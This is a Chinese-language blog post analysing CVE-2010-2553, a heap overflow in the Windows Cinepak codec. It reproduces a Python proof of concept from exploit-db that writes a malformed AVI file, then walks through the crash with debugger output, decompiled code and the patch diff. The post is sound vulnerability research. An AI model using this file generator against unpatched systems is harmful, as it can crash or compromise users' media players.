<!DOCTYPE HTML>
<html>
<head>
  <meta charset="utf-8">
  
  <title>CVE-2010-2553分析[漏洞战争] | WeaponX&#39;s Blog</title>
  <meta name="author" content="WeaponX">
  
  <meta name="description" content="Vulnerability|Security|Binary">
  
  
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

  <meta property="og:title" content="CVE-2010-2553分析[漏洞战争]"/>
  <meta property="og:site_name" content="WeaponX&#39;s Blog"/>

  
    <meta property="og:image" content="undefined"/>
  

  <link href="/favicon.png" rel="icon">
  <link rel="alternate" href="/atom.xml" title="WeaponX&#39;s Blog" type="application/atom+xml">
  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
  

  <script>
    var _hmt = _hmt || [];
    (function() {
    var hm = document.createElement("script");
    hm.src = "https://hm.baidu.com/hm.js?ab50f379bb6434641ee0125ce5d37f23";
    var s = document.getElementsByTagName("script")[0]; 
    s.parentNode.insertBefore(hm, s);
    })();
  </script>
  <script>
  (function(){
    var bp = document.createElement('script');
    var curProtocol = window.location.protocol.split(':')[0];
    if (curProtocol === 'https') {
      bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
    }
    else {
      bp.src = 'http://push.zhanzhang.baidu.com/push.js';
    }
    var s = document.getElementsByTagName("script")[0];
    s.parentNode.insertBefore(bp, s);
   })();
   </script>
</head>


<body>
  <header id="header" class="inner"><div class="alignleft">
  <h1><a href="/">WeaponX&#39;s Blog</a></h1>
  <h2><a href="/">Binary</a></h2>
</div>
<nav id="main-nav" class="alignright">
  <ul>
    
      <li><a href="/">Home</a></li>
    
      <li><a href="/archives">Archives</a></li>
    
  </ul>
  <div class="clearfix"></div>
</nav>
<div class="clearfix"></div>
</header>
  <div id="content" class="inner">
    <div id="main-col" class="alignleft"><div id="wrapper"><article class="post">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time datetime="2017-05-24T01:31:40.000Z"><a href="/2017/05/23/CVE-2010-2553分析-漏洞战争/">2017-05-23</a></time>
      
      
  
    <h1 class="title">CVE-2010-2553分析[漏洞战争]</h1>
  

    </header>
    <div class="entry">
      
        <h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>CVE 2010-2553漏洞，也称为MicrosoftWindows Cinepak 编码解码器解压缩漏洞，影响的操作系统版本有：Microsoft Windows XP SP2和SP3，WindowsVista SP1和SP2，以及Windows 7。</p>
<p>漏洞原因在于Cinepak 编码解码器对媒体文件解压缩时代码控制不恰当，可导致远程代码执行。如果用户打开特制的媒体文件，此漏洞可能允许执行代码。如果用户使用管理用户权限登录，成功利用此漏洞的攻击者便可完全控制受影响的系统。</p>
<p>漏洞利用wmplay.exe，而wmplay.exe这个播放器在国内很少有人使用，如果被攻击者使用了第三方的视频播放软件，很难攻击成功，这可能也是这一漏洞不被分析重视的一大原因。</p>
<a id="more"></a>
<p>在exploit-db找到老外的poc</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="string">'''</span></div><div class="line"></div><div class="line">  __  __  ____         _    _ ____  </div><div class="line"> |  \/  |/ __ \   /\  | |  | |  _ \</div><div class="line"> | \  / | |  | | /  \ | |  | | |_) |</div><div class="line"> | |\/| | |  | |/ /\ \| |  | |  _ &lt;</div><div class="line"> | |  | | |__| / ____ \ |__| | |_) |</div><div class="line"> |_|  |_|\____/_/    \_\____/|____/</div><div class="line"></div><div class="line">http://www.exploit-db.com/moaub-26-microsoft-cinepak-codec-cvdecompress-heap-overflow-ms10-055/</div><div class="line"></div><div class="line">'''</div><div class="line"></div><div class="line"><span class="string">'''</span></div><div class="line">  Title             : Microsoft Cinepak Codec CVDecompress Heap Overflow</div><div class="line">  Version           : iccvid.dll XP SP3</div><div class="line">  Analysis          : http://www.abysssec.com</div><div class="line">  Vendor            : http://www.microsoft.com</div><div class="line">  Impact            : High</div><div class="line">  Contact           : shahin [at] abysssec.com , info  [at] abysssec.com</div><div class="line">  Twitter           : @abysssec</div><div class="line">  CVE               : CVE-2010-2553</div><div class="line">  MOAUB Number      :</div><div class="line">'''</div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">import</span> sys</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></div><div class="line"></div><div class="line">    aviHeaders = <span class="string">'\x52\x49\x46\x46\x58\x01\x00\x00\x41\x56\x49\x20\x4C\x49\x53\x54\xC8\x00\x00\x00\x68\x64\x72\x6C\x61\x76\x69\x68\x38\x00\x00\x00\xA0\x86\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10\x01\x00\x00\x4E\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x60\x01\x00\x00\x20\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x4C\x49\x53\x54\x7C\x00\x00\x00\x73\x74\x72\x6C\x73\x74\x72\x68\x38\x00\x00\x00\x76\x69\x64\x73\x63\x76\x69\x64\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xE8\x03\x00\x00\x10\x27\x00\x00\x00\x00\x00\x00\x4E\x00\x00\x00\x20\x74\x00\x00\xFF\xFF\xFF\xFF\x00\x00\x00\x00\x00\x00\x00\x00\x60\x01\x20\x01\x73\x74\x72\x66\x28\x00\x00\x00\x28\x00\x00\x00\x50\x01\x00\x00\x20\x01\x00\x00\x01\x00\x18\x00\x63\x76\x69\x64\x84\x8D\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'</span></div><div class="line">    padding = <span class="string">'\x4A\x55\x4E\x4B\x00\x00\x00\x00\x4A\x55\x4E\x4B\x00\x00\x00\x00'</span></div><div class="line">    movi_tag = <span class="string">'\x4C\x49\x53\x54\x5C\x00\x00\x00\x6D\x6F\x76\x69\x30\x30\x64\x63\x10\x00\x00\x00'</span></div><div class="line">    cinepak_codec_data1 = <span class="string">'\x00\x00\x00\x68\x01\x60\x01\x20'</span></div><div class="line">    number_of_coded_strips = <span class="string">'\x00\x10'</span></div><div class="line">    cinepak_codec_data2 = <span class="string">'\x10\x00\x00\x10\x00\x00\x00\x00\x00\x60\x01\x60\x20\x00\x00\x00\x11\x00\x00\x10\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x11\x00\x00\x10\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x11\x00\x00\x10\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x11\x00\x00\x10\x41\x00'</span></div><div class="line">    idx_tag = <span class="string">'\x69\x64\x78\x31\x10\x00\x00\x00\x30\x30\x64\x63\x10\x00\x00\x00\x04\x00\x00\x00\x68\x00\x00\x00'</span></div><div class="line"></div><div class="line">    avifile = open(<span class="string">'poc.avi'</span>, <span class="string">'wb+'</span>)</div><div class="line">    avifile.write(aviHeaders)</div><div class="line">    avifile.write(padding)</div><div class="line">    avifile.write(movi_tag)</div><div class="line">    avifile.write(cinepak_codec_data1)</div><div class="line">    avifile.write(number_of_coded_strips)</div><div class="line">    avifile.write(cinepak_codec_data2)</div><div class="line">    avifile.write(idx_tag)</div><div class="line"></div><div class="line">    avifile.close()</div><div class="line">    <span class="keyword">print</span> <span class="string">'[-] AVI file generated'</span></div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    main()</div></pre></td></tr></table></figure>
<p>生成poc.avi后用wmplayer打开，直接崩溃。附加上windbg打开</p>
<p><img src="1.png" alt=""></p>
<p>看起来是iccvid.dll中<code>iccvid!CVDecompress+0x11e</code>出现的漏洞。</p>
<p>因为是堆溢出，我们这里开启页堆<code>!gflag +hpa</code>，页堆的机制就是在堆的末尾增加一个栅格，属性是不可访问。如果发生了堆溢出则会访问栅格造成异常。</p>
<p><img src="2.png" alt=""></p>
<p>发现edi就是页堆，即发生了堆溢出。</p>
<p>看看目的堆edi有多大</p>
<figure class="highlight elixir"><table><tr><td class="code"><pre><div class="line"><span class="number">0</span><span class="symbol">:</span><span class="number">014</span>&gt; !heap -p -a edi</div><div class="line">    address <span class="number">075</span>e700<span class="number">0</span> found <span class="keyword">in</span></div><div class="line">    _DPH_HEAP_ROOT @ a100<span class="number">0</span></div><div class="line">    <span class="keyword">in</span> busy allocation (  <span class="symbol">DPH_HEAP_BLOCK:</span>         UserAddr         UserSize -         VirtAddr         VirtSize)</div><div class="line">                                 <span class="number">7</span><span class="symbol">b92c38:</span>          <span class="number">75</span>e500<span class="number">0</span>             <span class="number">6000</span> -          <span class="number">75</span>e400<span class="number">0</span>             <span class="number">8000</span></div><div class="line">    <span class="number">7</span>c938f01 ntdll!RtlAllocateHeap+<span class="number">0x00000e64</span></div><div class="line">    <span class="number">7</span>c809a6f kernel32!LocalAlloc+<span class="number">0x00000058</span></div><div class="line">    <span class="number">73</span>b724a8 iccvid!CVDecompressBegin+<span class="number">0x00000080</span></div><div class="line">    <span class="number">73</span>b7c6a<span class="number">0</span> iccvid!DecompressBegin+<span class="number">0x00000214</span></div><div class="line">    <span class="number">73</span>b766a1 iccvid!DriverProc+<span class="number">0x00000198</span></div><div class="line">    <span class="number">73</span>b41938 MSVFW32!ICSendMessage+<span class="number">0x0000002b</span></div><div class="line">    <span class="number">7</span>cf8df19 quartz!<span class="symbol">CAVIDec:</span><span class="symbol">:StartStreaming+</span><span class="number">0x00000278</span></div><div class="line">    <span class="number">7</span>cf8d164 quartz!<span class="symbol">CTransformFilter:</span><span class="symbol">:Pause+</span><span class="number">0x00000060</span></div><div class="line">    <span class="number">7</span>cf8d0f2 quartz!<span class="symbol">CAVIDec:</span><span class="symbol">:Pause+</span><span class="number">0x0000002f</span></div><div class="line">    <span class="number">7</span>cf8cf69 quartz!<span class="symbol">CFilterGraph:</span><span class="symbol">:Pause+</span><span class="number">0x00000107</span></div><div class="line">    <span class="number">7</span>cf8ce93 quartz!<span class="symbol">CFGControl:</span><span class="symbol">:Cue+</span><span class="number">0x00000032</span></div><div class="line">    <span class="number">7</span>cfa4584 quartz!<span class="symbol">CFGControl:</span><span class="symbol">:CueThenRun+</span><span class="number">0x00000012</span></div><div class="line">    <span class="number">7</span>cfa44d7 quartz!<span class="symbol">CFGControl:</span><span class="symbol">:CImplMediaControl</span><span class="symbol">:</span><span class="symbol">:Run+</span><span class="number">0x0000002b</span></div><div class="line">    <span class="number">491</span>be351 wmp!<span class="symbol">CWMPGraph:</span><span class="symbol">:InternalPlay+</span><span class="number">0x00000039</span></div><div class="line">    <span class="number">491</span>be30<span class="number">0</span> wmp!<span class="symbol">CWMPGraph:</span><span class="symbol">:Play+</span><span class="number">0x000000a8</span></div><div class="line">    <span class="number">4917</span>ff31 wmp!<span class="symbol">CWMPControl:</span><span class="symbol">:InternalPlay+</span><span class="number">0x0000015c</span></div></pre></td></tr></table></figure>
<p>可以看出这个堆有0x6000，此时ecx=0x800，所以每次复制0x800 * 4 = 0x2000个字节。然后我们看看这个函数的伪代码。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="keyword">do</span></div><div class="line">&#123;</div><div class="line">  <span class="keyword">if</span> ( v29 &lt; <span class="number">0x16</span> )</div><div class="line">    <span class="keyword">break</span>;</div><div class="line">  HIBYTE(v15) = *(_BYTE *)(v14 + <span class="number">1</span>);</div><div class="line">  LOBYTE(v15) = *(_BYTE *)(v14 + <span class="number">2</span>);</div><div class="line">  v31 = *(_BYTE *)(v14 + <span class="number">3</span>) | (v15 &lt;&lt; <span class="number">8</span>);</div><div class="line">  <span class="keyword">if</span> ( v29 &lt; v31 )</div><div class="line">    <span class="keyword">break</span>;</div><div class="line">  <span class="keyword">if</span> ( *(_BYTE *)v14 == <span class="number">16</span> || *(_BYTE *)v14 == <span class="number">17</span> )</div><div class="line">  &#123;</div><div class="line">    <span class="keyword">if</span> ( ULongSub(v31, <span class="number">12</span>, &amp;a1) &lt; <span class="number">0</span> )</div><div class="line">      <span class="keyword">goto</span> LABEL_33;</div><div class="line">    HIBYTE(v16) = *(_BYTE *)(v14 + <span class="number">8</span>);</div><div class="line">    HIBYTE(v17) = *(_BYTE *)(v14 + <span class="number">4</span>);</div><div class="line">    LOBYTE(v16) = *(_BYTE *)(v14 + <span class="number">9</span>);</div><div class="line">    LOBYTE(v17) = *(_BYTE *)(v14 + <span class="number">5</span>);</div><div class="line">    v18 = v16 - v17;</div><div class="line">    LOWORD(v18) = *(_WORD *)(v7 + <span class="number">46</span>) * v18;</div><div class="line">    a2 = v18;</div><div class="line">    <span class="keyword">if</span> ( v32 &amp;&amp; !BYTE3(TotalLen) &amp;&amp; *(_BYTE *)v14 == <span class="number">17</span> )</div><div class="line">    &#123;</div><div class="line">      qmemcpy(</div><div class="line">        (<span class="keyword">void</span> *)(*(_DWORD *)(v7 + <span class="number">28</span>) + v32),</div><div class="line">        (<span class="keyword">const</span> <span class="keyword">void</span> *)(*(_DWORD *)(v7 + <span class="number">28</span>) + v32 - <span class="number">0x2000</span>),</div><div class="line">        <span class="number">0x2000</span>u);  <span class="comment">// vuln here</span></div><div class="line">      v14 = v26;</div><div class="line">    &#125;</div><div class="line">    v19 = v30 + <span class="number">12</span>;</div><div class="line">    v20 = v14 + <span class="number">12</span>;</div><div class="line">    *(_DWORD *)(v7 + <span class="number">56</span>) = v32 + *(_DWORD *)(v7 + <span class="number">32</span>);</div><div class="line">    v27 = v14 + <span class="number">12</span>;</div><div class="line">    *(_DWORD *)(v7 + <span class="number">60</span>) = a7;</div><div class="line">    <span class="keyword">while</span> ( a1 &gt;= <span class="number">4</span> )</div><div class="line">    &#123;</div><div class="line">      HIBYTE(v21) = *(_BYTE *)(v20 + <span class="number">1</span>);</div><div class="line">      LOBYTE(v21) = *(_BYTE *)(v20 + <span class="number">2</span>);</div><div class="line">      v22 = *(_BYTE *)(v20 + <span class="number">3</span>) | (v21 &lt;&lt; <span class="number">8</span>);</div><div class="line">      v24 = v22;</div><div class="line">      <span class="keyword">if</span> ( a1 &lt; v22 )</div><div class="line">        <span class="keyword">break</span>;</div><div class="line">      <span class="keyword">switch</span> ( *(_BYTE *)v20 )</div><div class="line">      &#123;</div><div class="line">        <span class="keyword">case</span> <span class="number">0x20</span>:</div><div class="line">        <span class="keyword">case</span> <span class="number">0x21</span>:</div><div class="line">        <span class="keyword">case</span> <span class="number">0x24</span>:</div><div class="line">        <span class="keyword">case</span> <span class="number">0x25</span>:</div><div class="line">          (*(<span class="keyword">void</span> (__stdcall **)(<span class="keyword">int</span>, _DWORD, _DWORD, _DWORD))v7)(</div><div class="line">            v19,</div><div class="line">            *(_DWORD *)(v7 + <span class="number">56</span>),</div><div class="line">            *(_DWORD *)(v7 + <span class="number">52</span>),</div><div class="line">            *(_DWORD *)(v7 + <span class="number">48</span>));</div><div class="line">          <span class="keyword">break</span>;</div><div class="line">        <span class="keyword">case</span> <span class="number">0x22</span>:</div><div class="line">        <span class="keyword">case</span> <span class="number">0x23</span>:</div><div class="line">        <span class="keyword">case</span> <span class="number">0x26</span>:</div><div class="line">        <span class="keyword">case</span> <span class="number">0x27</span>:</div><div class="line">          (*(<span class="keyword">void</span> (__stdcall **)(<span class="keyword">int</span>, <span class="keyword">int</span>, _DWORD, _DWORD))(v7 + <span class="number">4</span>))(</div><div class="line">            v19,</div><div class="line">            *(_DWORD *)(v7 + <span class="number">56</span>) + <span class="number">4096</span>,</div><div class="line">            *(_DWORD *)(v7 + <span class="number">52</span>),</div><div class="line">            *(_DWORD *)(v7 + <span class="number">48</span>));</div><div class="line">          <span class="keyword">break</span>;</div><div class="line">        <span class="keyword">case</span> <span class="number">0x30</span>:</div><div class="line">          (*(<span class="keyword">void</span> (__stdcall **)(<span class="keyword">unsigned</span> <span class="keyword">int</span>, <span class="keyword">int</span>, <span class="keyword">int</span>, <span class="keyword">int</span>, <span class="keyword">int</span>, <span class="keyword">int</span>, <span class="keyword">int</span>))(v7 + <span class="number">8</span>))(</div><div class="line">            v7,</div><div class="line">            v19 + <span class="number">4</span>,</div><div class="line">            v22 - <span class="number">4</span>,</div><div class="line">            a4,</div><div class="line">            a5,</div><div class="line">            a6,</div><div class="line">            a2);</div><div class="line">          <span class="keyword">break</span>;</div><div class="line">        <span class="keyword">case</span> <span class="number">0x31</span>:</div><div class="line">          (*(<span class="keyword">void</span> (__stdcall **)(<span class="keyword">unsigned</span> <span class="keyword">int</span>, <span class="keyword">int</span>, <span class="keyword">int</span>, <span class="keyword">int</span>, <span class="keyword">int</span>, <span class="keyword">int</span>, <span class="keyword">int</span>))(v7 + <span class="number">16</span>))(</div><div class="line">            v7,</div><div class="line">            v19 + <span class="number">4</span>,</div><div class="line">            v22 - <span class="number">4</span>,</div><div class="line">            a4,</div><div class="line">            a5,</div><div class="line">            a6,</div><div class="line">            a2);</div><div class="line">          <span class="keyword">break</span>;</div><div class="line">        <span class="keyword">case</span> <span class="number">0x32</span>:</div><div class="line">          (*(<span class="keyword">void</span> (__stdcall **)(<span class="keyword">unsigned</span> <span class="keyword">int</span>, <span class="keyword">int</span>, <span class="keyword">int</span>, <span class="keyword">int</span>, <span class="keyword">int</span>, <span class="keyword">int</span>, <span class="keyword">int</span>))(v7 + <span class="number">12</span>))(</div><div class="line">            v7,</div><div class="line">            v19 + <span class="number">4</span>,</div><div class="line">            v22 - <span class="number">4</span>,</div><div class="line">            a4,</div><div class="line">            a5,</div><div class="line">            a6,</div><div class="line">            a2);</div><div class="line">          <span class="keyword">break</span>;</div><div class="line">        <span class="keyword">default</span>:</div><div class="line">          <span class="keyword">break</span>;</div><div class="line">      &#125;</div><div class="line">      v20 = v24 + v27;</div><div class="line">      v23 = <span class="number">1</span>;</div><div class="line">      v19 += v24;</div><div class="line">      v27 += v24;</div><div class="line">      <span class="keyword">if</span> ( v24 &gt; <span class="number">1</span> )</div><div class="line">        v23 = v24;</div><div class="line">      a1 -= v23;</div><div class="line">    &#125;</div><div class="line">    a6 += a7 * (<span class="keyword">signed</span> __int16)a2;</div><div class="line">    ++idx;</div><div class="line">    v32 += <span class="number">0x2000</span>;</div><div class="line">  &#125;</div><div class="line">  v30 += v31;</div><div class="line">  v29 -= v31;</div><div class="line">  v14 += v31;</div><div class="line">  v26 = v14;</div><div class="line">&#125;</div><div class="line"><span class="keyword">while</span> ( idx &lt; CodedStripNum );</div></pre></td></tr></table></figure>
<p>可以看出，每次循环后，会将edi的地址增加0x2000，注意v32这个变量，第一次其实并没有复制，因为第一次v32为0，也就是说qmemcpy复制两次就会导致堆溢出。</p>
<p>分析一下PoC，根据CVID格式分析(<a href="https://multimedia.cx/mirror/cinepak.txt" target="_blank" rel="external">https://multimedia.cx/mirror/cinepak.txt</a>)</p>
<figure class="highlight lsl"><table><tr><td class="code"><pre><div class="line">flag = <span class="number">0x00</span></div><div class="line">cvid长度 = <span class="number">0x000068</span></div><div class="line">coded frame宽度 = <span class="number">0x1060</span></div><div class="line">coded frame高度 = <span class="number">0x1020</span></div><div class="line">coded strip数量 = <span class="number">0x0010</span></div></pre></td></tr></table></figure>
<p>可以看出coded strip数量应该是小于3即可防止多次拷贝导致堆溢出。</p>
<h2 id="patchdiff"><a href="#patchdiff" class="headerlink" title="patchdiff"></a>patchdiff</h2><p><img src="3.png" alt=""></p>
<p>patchdiff下发现pathc了这个函数，看看patch在哪</p>
<p><img src="4.png" alt=""></p>
<p>可以看出，对比了coded strip是否大于3，大于3则退出。</p>

      
    </div>
    <footer>
      
        
          <p style="border-top: #e0e0e0 1px dashed; border-right: #e0e0e0 1px dashed; border-bottom: #e0e0e0 1px dashed; border-left: #e0e0e0 1px dashed; padding-top: 10px;padding-right: 10px;padding-bottom: 10px;padding-left: 110px; background: url(http://i.creativecommons.org/l/by-nc-sa/2.5/cn/88x31.png) #e5f1f4 no-repeat 1% 50%; font-family: 微软雅黑; font-size:11px;" id="PSignature">  
作者：<a href="http://weaponx.site">WeaponX</a>
<br>出处：<a href="http://weaponx.site/2017/05/23/CVE-2010-2553分析-漏洞战争/">http://weaponx.site/2017/05/23/CVE-2010-2553分析-漏洞战争/</a>           
<br>本文采用<a href="http://creativecommons.org/licenses/by-nc-sa/2.5/cn/" rel="license">知识共享署名-非商业性使用-相同方式共享 2.5 中国大陆许可协议</a>进行许可，欢迎转载，但未经作者同意必须保留此段声明，且在文章页面明显位置给出原文连接。
</p>

        
        
  
  <div class="categories">
    <a href="/categories/安全/">安全</a>
  </div>

        
  
  <div class="tags">
    <a href="/tags/安全/">安全</a>, <a href="/tags/漏洞分析/">漏洞分析</a>
  </div>

        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>


<section id="comment">
  
  
  
    <div id="cloud-tie-wrapper" class="cloud-tie-wrapper"></div>
    <script src="https://img1.cache.netease.com/f2e/tie/yun/sdk/loader.js"></script>
    <script>
    var cloudTieConfig = {
        url: document.location.href, 
        sourceId: "",
        productKey: "0d4cadd44ae547119479fb84d9f5260e",
        target: "cloud-tie-wrapper"
    };
    var yunManualLoad = true;
    Tie.loader("aHR0cHM6Ly9hcGkuZ2VudGllLjE2My5jb20vcGMvbGl2ZXNjcmlwdC5odG1s", true);
    </script>
  
</section>


</div></div>
    <aside id="sidebar" class="alignright">
  <div class="search">
  <form action="//google.com/search" method="get" accept-charset="utf-8">
    <input type="search" name="q" results="0" placeholder="搜索">
    <input type="hidden" name="q" value="site:weaponx.site">
  </form>
</div>

  
<div class="widget tag">
  <h3 class="title">分类</h3>
  <ul class="entry">
  
    <li><a href="/categories/安全/">安全</a><small>7</small></li>
  
    <li><a href="/categories/tech/">技术</a><small>21</small></li>
  
    <li><a href="/categories/life/">生活</a><small>3</small></li>
  
  </ul>
</div>


  
<div class="widget tag">
  <h3 class="title">标签</h3>
  <ul class="entry">
  
    <li><a href="/tags/ASLR/">ASLR</a><small>1</small></li>
  
    <li><a href="/tags/Django/">Django</a><small>1</small></li>
  
    <li><a href="/tags/Hexo/">Hexo</a><small>4</small></li>
  
    <li><a href="/tags/Linux/">Linux</a><small>1</small></li>
  
    <li><a href="/tags/UAF/">UAF</a><small>2</small></li>
  
    <li><a href="/tags/pwn/">pwn</a><small>13</small></li>
  
    <li><a href="/tags/python/">python</a><small>2</small></li>
  
    <li><a href="/tags/wargame/">wargame</a><small>3</small></li>
  
    <li><a href="/tags/博客/">博客</a><small>4</small></li>
  
    <li><a href="/tags/安全/">安全</a><small>17</small></li>
  
    <li><a href="/tags/影评/">影评</a><small>1</small></li>
  
    <li><a href="/tags/整形溢出/">整形溢出</a><small>1</small></li>
  
    <li><a href="/tags/漏洞分析/">漏洞分析</a><small>2</small></li>
  
    <li><a href="/tags/调试/">调试</a><small>1</small></li>
  
  </ul>
</div>


  
<div class="widget tag">
  <h3 class="title">友情链接</h3>
  <ul class="entry">
  
    <li><a href="http://www.cnblogs.com/goabout2/" title="goabout2">goabout2</a></li>
  
    <li><a href="http://rootkiter.com/" title="RootKiter">RootKiter</a></li>
  
    <li><a href="http://reverse-tcp.xyz/" title="Urahara">Urahara</a></li>
  
    <li><a href="https://www.leavesongs.com/" title="phith0n牛的离别歌">phith0n</a></li>
  
  </ul>
</div>



  <div class="widget tag">
  <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=270 height=86 src="//music.163.com/outchain/player?type=2&id=427542287&auto=0&height=66"></iframe>
</div>

</aside>
    <div class="clearfix"></div>
  </div>
  <footer id="footer" class="inner"><div class="alignleft">
  
  &copy; 2017 WeaponX
  
</div>
<div class="clearfix"></div></footer>
  <script src="http://apps.bdimg.com/libs/jquery/2.0.3/jquery.min.js"></script>
<script src="/js/jquery.imagesloaded.min.js"></script>
<script src="/js/gallery.js"></script>




<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
<script src="/fancybox/jquery.fancybox.pack.js"></script>
<script type="text/javascript">
(function($){
  $('.fancybox').fancybox();
})(jQuery);
</script>


</body>
</html>
